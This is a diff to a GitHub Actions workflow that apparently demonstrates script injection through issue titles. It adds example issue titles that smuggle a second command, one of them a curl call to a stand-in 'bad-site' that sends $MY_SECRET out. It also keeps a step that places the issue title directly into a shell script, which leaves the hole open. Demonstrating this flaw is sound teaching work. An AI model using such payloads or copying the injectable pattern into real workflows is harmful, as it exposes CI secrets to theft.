@@ -10,7 +10,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Print instruction
-        run: echo Create an issue entitled, e.g.':' 'a";echo I have executed a script!"'
+        run: | 
+          echo Create an issue entitled, e.g.':' 'a";echo I have executed a script!"'
+          echo As a result, an echo script will be executed
+          echo "---"
+          echo Now imagine such a name ':' 'a"; curl http://bad-site/steal-password/$MY_SECRET'
       - name: Assign label
         run: |
           title="${{github.event.issue.title}}"
